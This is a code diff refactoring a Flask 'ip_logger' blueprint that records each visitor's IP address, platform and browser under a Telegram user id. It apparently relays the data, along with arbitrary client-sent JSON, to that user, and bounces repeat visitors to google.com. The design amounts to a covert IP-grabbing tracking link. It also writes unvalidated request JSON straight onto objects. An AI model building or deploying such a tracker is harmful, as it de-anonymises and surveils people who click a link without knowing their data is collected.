@@ -88,15 +88,13 @@ ____________________
         )
 
 
-logged_ips: Dict[str, IPLog] = dict()
+ips: Dict[str, IPLog] = dict()
 
 
 bp = Blueprint(
     "ip_logger",
     __name__,
-    template_folder="../../templates",
-    static_folder="../../static",
-    static_url_path="/static"
+    template_folder="../../templates"
 )
 
 pattern = re.compile(r"(?:Mozilla\/5\.0 \()(.+?)(?:\))")
@@ -106,19 +104,20 @@ pattern = re.compile(r"(?:Mozilla\/5\.0 \()(.+?)(?:\))")
 def logger(tg_user_id: int):
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
 
-    if (ip_log := logged_ips.get(ip)) is None:
-        logged_ips[ip] = IPLog(ip_address=ip, receiver_tg_id=tg_user_id)
-    elif time.time() - ip_log.last_response <= 60:
+    if ips.get(ip) is None:
+        ips[ip] = IPLog(ip_address=ip, receiver_tg_id=tg_user_id)
+
+    elif time.time() - ips[ip].last_response <= 60:
         return redirect("https://google.com")
     else:
-        ip_log.last_response = time.time()
-        ip_log.receiver_tg_id = tg_user_id
+        ips[ip].last_response = time.time()
+        ips[ip].receiver_tg_id = tg_user_id
 
     platform = pattern.search(request.user_agent.string)
-    ip_log.platform = request.user_agent.string if platform is None \
+    ips[ip].platform = request.user_agent.string if platform is None \
         else platform.group(1)
 
-    ip_log.browser = f"{request.user_agent.browser}\
+    ips[ip].browser = f"{request.user_agent.browser}\
         {request.user_agent.version}".replace(" ", "")
 
     return render_template("index.html")
@@ -128,12 +127,11 @@ def logger(tg_user_id: int):
 def add_log():
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
 
-    ip_log = logged_ips[ip]
-    if time.time() - ip_log.last_response >= 2:
+    if time.time() - ips[ip].last_response >= 2:
         return "fuck u"
 
     new_data = request.get_json()
-    ip_log.__setattrs__(**new_data)
-    ip_log.send_log()
+    ips[ip].__setattrs__(**new_data)
+    ips[ip].send_log()
 
     return "ok"
